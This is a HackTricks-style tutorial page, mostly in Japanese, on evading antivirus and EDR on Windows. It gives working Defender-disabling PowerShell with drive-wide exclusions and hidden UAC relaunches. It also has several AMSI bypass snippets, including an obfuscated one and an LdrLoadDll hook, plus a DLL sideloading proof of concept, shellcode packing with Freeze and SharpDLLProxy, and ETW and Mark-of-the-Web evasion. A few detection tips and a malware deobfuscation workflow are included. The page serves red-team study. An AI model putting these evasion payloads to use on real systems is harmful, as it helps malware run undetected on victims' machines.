# Antivirus (AV) バイパス

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**が書きました！**

## Defender を停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender を停止させるツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender を操作する前のインストーラー風 UAC 誘導

ゲームのチートに見せかけた公開ローダーは、未署名の Node.js/Nexe インストーラーとして配布されることが多く、最初に **ユーザーに昇格を求める** と、その後に Defender を無効化します。流れは単純です：

1. `net session` で管理者コンテキストを確認します。このコマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗するとローダーが標準ユーザーとして動作していることを示します。
2. 元のコマンドラインを保持したまま、期待される UAC 同意プロンプトを発生させるために `RunAs` verb を使って直ちに自身を再起動します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに “cracked” ソフトウェアをインストールしていると信じているため、プロンプトは通常受け入れられ、マルウェアに Defender のポリシーを変更するために必要な権限が与えられる。

### すべてのドライブレターに対する包括的な `MpPreference` 除外

権限昇格が完了すると、GachiLoader-style チェーンはサービスを完全に無効化する代わりに Defender の盲点を最大化する。the loader はまず GUI の監視プロセスを終了させ（`taskkill /F /IM SecHealthUI.exe`）、その後 **極めて広範な除外** を適用して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクがスキャン不能になるようにする:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- ループはマウントされたすべてのファイルシステム（D:\, E:\, USB スティックなど）を走査するため、**any future payload dropped anywhere on disk is ignored**。
- `.sys` 拡張子の除外は将来を見越したもので、攻撃者は後で署名されていないドライバをロードするオプションを残しておき、再度 Defender に触れる必要をなくしている。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に記録されるため、後続のステージで除外が持続しているか確認したり、UAC を再トリガーせずにそれらを拡張したりできる。

Defender のサービスは停止されないため、単純なヘルスチェックは「“antivirus active”」と報告を続けるが、リアルタイム検査はこれらのパスをまったく検査していない。

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、static detection、dynamic analysis、そしてより高度な EDRs では behavioural analysis を使用している。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト列をフラグ化したり、ファイル自体から情報を抽出することで行われる（例：file description、company name、digital signatures、icon、checksum など）。そのため、既知の公開ツールを使うと検出されやすくなることが多い。こうした検知を回避する方法はいくつかある：

- **Encryption**

バイナリを暗号化すれば、AV はプログラムを検出できなくなるが、プログラムをメモリ上で復号して実行するためのローダーが必要になる。

- **Obfuscation**

バイナリやスクリプト内のいくつかの文字列を変更するだけで AV をすり抜けられる場合もあるが、何を難読化するかによっては手間がかかる。

- **Custom tooling**

独自ツールを開発すれば既知の悪いシグネチャは存在しないが、多くの時間と労力が必要になる。

> [!TIP]
> Windows Defender の static detection をチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) である。これはファイルを複数のセグメントに分割し、それぞれを Defender にスキャンさせることで、バイナリ内でフラグ化されている正確な文字列やバイトを特定できる。

実践的な AV Evasion に関するこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) は強くおすすめする。

### **Dynamic analysis**

Dynamic analysis は AV がバイナリをサンドボックス内で実行し、ブラウザのパスワードを復号して読み取ろうとする、LSASS の minidump を取得しようとするなどの悪意ある活動を監視する手法である。これは扱いがやや難しいが、サンドボックスを回避するために行えることはいくつかある。

- **Sleep before execution** 実装次第では、AV の dynamic analysis を回避する良い手段になり得る。AV はユーザーの作業を阻害しないようファイルを短時間でスキャンするため、長時間の sleep を入れるとバイナリの解析を妨げることがある。ただし、多くの AV のサンドボックスは実装方法によっては sleep をスキップできる。
- **Checking machine's resources** 通常、サンドボックスは作業用のリソースが非常に少ない（例：< 2GB RAM）ため、ユーザーのマシンを遅くしないようになっている。ここでは創造的になれる余地があり、例えば CPU の温度やファン速度をチェックするなど、サンドボックスには実装されていない情報を参照することもできる。
- **Machine-specific checks** 特定のユーザー（例："contoso.local" ドメインに参加しているワークステーション）を狙う場合、コンピュータのドメインが指定したものと一致するかをチェックし、一致しなければプログラムを終了させる、というようなことができる。

実際、Microsoft Defender の Sandbox の computername は HAL9TH であることが分かっているため、デトネーションの前にコンピュータ名をチェックし、名前が HAL9TH であれば defender のサンドボックス内にいると判断してプログラムを終了させることができる。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) からのサンドボックス対策に関する他の良いヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

前述したように、**public tools** は最終的に **get detected** されるので、自問すべきことがある：

例えば、LSASS をダンプしたい場合、本当に **mimikatz** を使う必要があるだろうか？それとも、あまり知られていない別のプロジェクトを使って LSASS をダンプできないだろうか。

正しい答えはおそらく後者だ。mimikatz を例に取れば、それは AV や EDR に最も多くフラグ化されているツールの一つであり、プロジェクト自体は非常に優れているが、AV を回避するために扱うのは悪夢のように難しい。したがって、達成したいことに対する代替手段を探せ。

> [!TIP]
> ペイロードを回避向けに変更する際は、Defender で自動サンプル送信（automatic sample submission）をオフにすることを必ず行い、長期的に evasion を目指すのであれば、絶対に VIRUSTOTAL にアップロードしないでください。特定の AV による検出を確認したい場合は、VM にその AV をインストールして自動サンプル送信をオフにし、そこで満足するまでテストを繰り返すとよい。

## EXEs vs DLLs

可能な限り、evation のためには常に **DLLs** を優先すること。私の経験では、DLL ファイルは通常 **way less detected** かつ解析されにくいことが多く、ペイロードが DLL として実行できる場合には検出を避けるための非常に単純なトリックになる。

以下の画像で分かるように、Havoc の DLL ペイロードは antiscan.me で 4/26 の検出率である一方、EXE ペイロードは 7/26 の検出率だった。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me による通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介する。

## DLL Sideloading & Proxying

**DLL Sideloading** は、loader が使用する DLL search order を悪用し、victim application と malicious payload(s) を同じ場所に配置することで成立する。

DLL Sideloading に脆弱なプログラムを検出するには [Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使うことができる：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、 "C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

私は **DLL Hijackable/Sideloadable programs を自分で調査すること** を強くお勧めします。この技術は適切に行えばかなりステルス性がありますが、公開されている DLL Sideloadable programs を使うと簡単に検出・摘発される可能性があります。

単にプログラムが読み込むことを期待している名前の malicious DLL を置いただけでは、プログラムがその DLL 内に特定の関数を期待しているため、payload を読み込ませられないことが多いです。この問題を解決するために、別の技術である **DLL Proxying/Forwarding** を使います。

**DLL Proxying** は、プログラムが proxy (and malicious) DLL に対して行う呼び出しを元の DLL に転送し、プログラムの機能を維持しつつ payload の実行を扱えるようにします。

今回は [@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。

以下は私が実行した手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは2つのファイルを生成します: DLL ソースコードテンプレートとリネームされた元の DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Forwarded Exports の悪用 (ForwardSideLoading)

Windows PE モジュールは、実際には "forwarders" である関数をエクスポートできます：コードを指す代わりに、エクスポートエントリは `TargetDll.TargetFunc` の形式の ASCII 文字列を含みます。呼び出し元がエクスポートを解決すると、Windows ローダは次を行います：

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

理解すべき主な挙動:
- もし `TargetDll` が KnownDLL であれば、保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から供給されます。
- もし `TargetDll` が KnownDLL でなければ、モジュールがフォワード解決を行っているディレクトリを含む通常の DLL 検索順が使用されます。

これは間接的な sideloading プリミティブを可能にします：関数を非-KnownDLL モジュール名にフォワードしている signed DLL を見つけ、その signed DLL をフォワード先のモジュール名とまったく同じ名前の attacker-controlled DLL と同じディレクトリに配置します。フォワードされたエクスポートが呼び出されると、ローダはフォワードを解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC（コピペ）:
1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
同じフォルダに悪意のある`NCRYPTPROV.dll`を配置する。最小限の`DllMain`があればコード実行が可能で、`DllMain`をトリガーするためにフォワードされた関数を実装する必要はない。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済みの LOLBin で forward をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（署名済み）がサイドバイサイドの`keyiso.dll`（署名済み）をロードする
- `KeyIsoSetAuditingInterface` を解決する際、ローダはフォワードをたどって `NCRYPTPROV.SetAuditingInterface` に移る
- ローダはその後 `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後に初めて「missing API」エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- 次のようなツールで forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 の forwarder インベントリを参照して候補を探す: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins（例: rundll32.exe）が非システムパスから署名済みDLLをロードし、そのディレクトリから同じベース名の non-KnownDLLs を続けてロードする動きを監視する
- 次のようなプロセス/モジュールチェーンでアラートを出す: `rundll32.exe` → 非システムな `keyiso.dll` → `NCRYPTPROV.dll` がユーザー書き込み可能なパス上で発生する場合
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って、shellcode をステルスにロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避はいたちごっこに過ぎません。今日有効な方法が明日検出される可能性があるため、単一のツールのみに頼らないでください。可能であれば複数の回避技術を連鎖させて使用してください。

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

AMSI 機能は Windows の以下のコンポーネントに統合されています。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

スクリプトの内容を暗号化・難読化されていない形で公開することで、アンチウイルスがスクリプトの挙動を検査できるようにします。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

`amsi:` が先頭に付加され、その後にスクリプトが実行された実行ファイルのパス（この場合は powershell.exe）が表示される点に注意してください。

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

ファイルをディスクに書き込んでいないにも関わらず、AMSI によってインメモリで検出されてしまいました。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

さらに、**.NET 4.8** 以降では C# コードも AMSI を経由して実行されます。これは `Assembly.Load(byte[])` によるインメモリ実行にも影響します。したがって、AMSI を回避する目的でインメモリ実行を行う場合は、**.NET 4.7.2** 以下などの古いバージョンを使用することが推奨されます。

There are a couple of ways to get around AMSI:

AMSI を回避する方法はいくつかあります：

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

AMSI は主に静的検出で動作するため、読み込もうとするスクリプトを変更することは検出回避に有効な場合があります。ただし、AMSI は多層にわたる難読化を解除する機能を持っているため、難読化のやり方によっては逆効果になることがあります。そのため必ずしも簡単ではありません。とはいえ、単純に変数名をいくつか変えるだけで回避できる場合もあるので、どの程度フラグが立っているかによります。

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

AMSI は DLL を powershell（および cscript.exe、wscript.exe など）のプロセスにロードすることで実装されているため、特権のないユーザーでも簡単に改ざんすることが可能です。この実装上の欠陥により、研究者たちは AMSI スキャンを回避する複数の手法を見出しています。

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.

AMSI の初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。これは元々 Matt Graeber によって公開され、Microsoft はその広範な利用を防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするには、powershell のコード1行だけで済みました。もちろんその1行は AMSI 自身に検出されるため、この手法を使用するにはいくつかの改変が必要です。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から持ってきた改変済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。手法は、ユーザーが提供した入力のスキャンを担当する amsi.dll 内の "AmsiScanBuffer" 関数のアドレスを見つけ、E_INVALIDARG を返すように戻る命令で上書きする、というものです。こうすることで実際のスキャン結果は 0 を返し、これはクリーン（検出なし）として解釈されます。

> [!TIP]
> 詳細な説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を参照してください。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI をブロックする — amsi.dll のロードを防ぐ (LdrLoadDll hook)

AMSI は `amsi.dll` が現在のプロセスにロードされて初めて初期化されます。堅牢で言語非依存のバイパス手法は、`ntdll!LdrLoadDll` に user‑mode hook を設置して、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI はロードされず、そのプロセスではスキャンが行われません。

実装概要 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も AMSI をバイパスするスクリプトを生成します。  
The tool **[https://amsibypass.com/](https://amsibypass.com/)** は、ユーザー定義関数、変数、文字列式をランダム化し、PowerShell キーワードの文字ケースをランダムにすることでシグネチャを回避するスクリプトを生成します。

**検出されたシグネチャを削除する**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは、現在のプロセスのメモリを AMSI シグネチャでスキャンし、NOP 命令で上書きすることでメモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell バージョン 2 を使用する**

PowerShell バージョン 2 を使用すると AMSI は読み込まれないため、スクリプトを AMSI によるスキャンなしで実行できます。方法は以下の通りです:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに有益ですが、検知を回避したい攻撃者にとっては問題になることがあります。

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: この目的のために [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使えます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI はロードされないため、AMSI によるスキャンを受けずにスクリプトを実行できます。これを行うには: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御のない powershell を起動します（これは Cobal Strike の `powerpick` が使う手法です）。


## Obfuscation

> [!TIP]
> 多くの obfuscation techniques はデータを暗号化することに依存しており、その結果バイナリのエントロピーが上がり、AVs や EDRs に検知されやすくなります。これには注意し、暗号化は機密性の高いコード部分や隠す必要のあるセクションのみに限定することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用フォーク）を使ったマルウェアを解析する際、デコンパイラやサンドボックスを妨げる複数の保護レイヤーに直面することがよくあります。以下のワークフローは、ほぼ元の IL を再構築し、その後 dnSpy や ILSpy などのツールで C# にデコンパイルできる状態に戻すのに信頼できる手順です。

1.  Anti-tampering removal – ConfuserEx は各 *method body* を暗号化し、*module* の static constructor (`<Module>.cctor`) 内で復号します。これにより PE checksum もパッチされるため、改変するとバイナリがクラッシュします。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き直します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 個の anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれ、独自の unpacker を作る際に役立ちます。

2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespace、class、変数名を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx はデコンパイルをさらに難しくするために直接呼び出しを軽量ラッパー（いわゆる *proxy calls*）に置き換えます。**ProxyCall-Remover** でそれらを削除します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後、`Class8.smethod_10` のような不透明なラッパー関数の代わりに `Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見られるはずです。

4.  Manual clean-up – 生成されたバイナリを dnSpy で実行せずに開き、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して *real* payload を特定します。マルウェアはしばしば `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。

上記のチェーンは、悪意あるサンプルを実行することなく実行フローを復元します — オフラインの作業環境で作業する場合に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルの自動トリアージ用 IOC として使えます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、code obfuscation と tamper-proofing を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使って、コンパイル時に外部ツールを使わず、コンパイラを変更することなく obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションを解析しようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は .exe、.dll、.sys を含む様々な pe files を難読化できる x64 binary obfuscator です。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行可能ファイル向けの simple metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は、LLVM-supported languages 向けの細粒度なコード難読化フレームワークで、ROP (return-oriented programming) を使用します。ROPfuscator は通常の命令を ROP chains に変換することでアセンブリコードレベルでプログラムを難読化し、通常の制御フローの自然な把握を阻害します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) は [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) の Zone.Identifier という名前の ADS で、インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元の URL が記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しています。</p></figcaption></figure>

> [!TIP]
> trusted signing certificate で署名された実行ファイルは SmartScreen をトリガーしない点に注意してください。

payloads が Mark of The Web を付与されるのを防ぐ非常に効果的な方法の一つは、ISO のようなコンテナにパッケージすることです。これは Mark-of-the-Web (MOTW) が non NTFS ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は payloads を出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows の強力なロギング機構で、アプリケーションやシステムコンポーネントがイベントを**ログ**することを可能にします。しかし、同時にセキュリティ製品が悪意のある活動を監視・検出するためにも利用されます。

AMSI を無効化（バイパス）するのと同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントを記録せず即座に return するようにすることも可能です。これは関数をメモリ上でパッチし即座に return するように変更することで行われ、そのプロセスに対する ETW ロギングを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

メモリ上で C# バイナリをロードする手法は以前から知られており、AV に検知されずにポストエクスプロイトツールを実行する非常に有効な方法です。

